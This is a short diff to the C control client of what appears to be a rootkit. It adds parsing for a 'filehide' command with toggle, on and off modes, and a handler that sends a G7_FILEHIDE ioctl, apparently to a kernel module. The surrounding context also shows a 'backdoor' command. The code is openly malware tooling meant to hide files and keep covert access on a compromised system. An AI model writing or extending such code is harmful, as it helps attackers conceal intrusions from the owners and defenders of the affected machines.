@@ -31,14 +31,20 @@ parse_input(int argc, char **argv)
         exit(0);
     }
 
-    if (ARGVCMP(1, "ping")) {
+    if (ARGVCMP(1, "ping"))
         return (cmd_t){ handle_ping, NULL };
-        // TODO: return ping handle
-    }
 
     if (ARGVCMP(1, "filehide")) {
         ASSERT_ARGC(2, "filehide <toggle | on | off>");
-        // TODO: return filehide handle
+
+        if (ARGVCMP(2, "toggle"))
+            return (cmd_t){ handle_filehide, (void *)0 };
+
+        if (ARGVCMP(2, "on"))
+            return (cmd_t){ handle_filehide, (void *)1 };
+
+        if (ARGVCMP(2, "off"))
+            return (cmd_t){ handle_filehide, (void *)-1 };
     }
 
     if (ARGVCMP(1, "backdoor")) {
@@ -69,6 +75,7 @@ handle_ping(void *arg)
 int
 handle_filehide(void *arg)
 {
+    return issue_ioctl(G7_FILEHIDE, (char *)arg);
 }
 
 int
